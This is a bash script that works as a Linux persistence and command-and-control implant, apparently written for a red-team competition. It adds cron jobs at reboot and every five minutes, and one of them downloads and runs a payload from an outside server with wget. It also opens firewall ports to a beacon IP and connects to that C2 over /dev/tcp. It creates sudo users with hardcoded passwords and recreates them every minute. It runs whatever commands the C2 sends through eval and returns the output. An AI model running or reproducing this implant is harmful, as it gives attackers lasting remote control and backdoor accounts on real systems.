#!/bin/bash

# Check for mandatory beacon IP address argument
if [ -z "$1" ]; then
  echo "Usage: $0 <beaconIPAddress>"
  exit 1
fi

beaconIPAddress=$1

# Create a startup task using crontab for persistence (runs at boot)
cronjob="@reboot /path/to/linuxPayload.sh"
(crontab -l ; echo "$cronjob") | crontab -

# Create a backup script to ensure the main payload is downloaded if deleted
backup_dir="/opt/Webkinz"
main_payload="/opt/EpicGames/linuxPayload.sh"
backup_script="$backup_dir/backup.sh"

# Ensure the backup directory exists
if [ ! -d "$backup_dir" ]; then
  mkdir -p "$backup_dir"
fi

# Create the backup script
if [ ! -f "$backup_script" ]; then
  cat << EOF > "$backup_script"
#!/bin/bash
if [ ! -f "$main_payload" ]; then
  wget -O "$main_payload" "http://gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/linuxPayload.sh"
  chmod +x "$main_payload"
  nohup bash "$main_payload" -BeaconIPAddress $beaconIPAddress &
fi
EOF
  chmod +x "$backup_script"
fi

# Set up a cron job to run the backup script every 5 minutes
cronjob="*/5 * * * * $backup_script"
(crontab -l ; echo "$cronjob") | crontab -

# Add firewall rules (iptables equivalent)
iptables -A INPUT -p tcp --dport 5985 -s $beaconIPAddress -j ACCEPT
iptables -A INPUT -p tcp --dport 5986 -s $beaconIPAddress -j ACCEPT
iptables -A OUTPUT -p tcp --dport 80 -d $beaconIPAddress -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -d $beaconIPAddress -j ACCEPT
iptables -A INPUT -p tcp --dport 3389 -s $beaconIPAddress -j ACCEPT

# Create TCP connection to the server
exec 3<>/dev/tcp/$beaconIPAddress/80

# Send initial message to C2
echo "Linux" >&3

# Add users
for user in "Jimithy:Password-123456" "Doug:Password-12345"; do
  username=$(echo "$user" | cut -d':' -f1)
  password=$(echo "$user" | cut -d':' -f2)
  
  if ! id -u $username >/dev/null 2>&1; then
    useradd $username
    echo "$username:$password" | chpasswd
    usermod -aG sudo $username
  fi
done

# Check every minute if users exist and create them if necessary
while true; do
  sleep 60

  for user in "Jimithy:Password-123456" "Doug:Password-12345"; do
    username=$(echo "$user" | cut -d':' -f1)
    password=$(echo "$user" | cut -d':' -f2)

    if ! id -u $username >/dev/null 2>&1; then
      useradd $username
      echo "$username:$password" | chpasswd
      usermod -aG sudo $username
    fi
  done

  # Read command from the C2
  if read -t 1 command <&3; then
    eval "$command" > /tmp/c2_output.txt 2>&1
    cat /tmp/c2_output.txt >&3
  fi
done
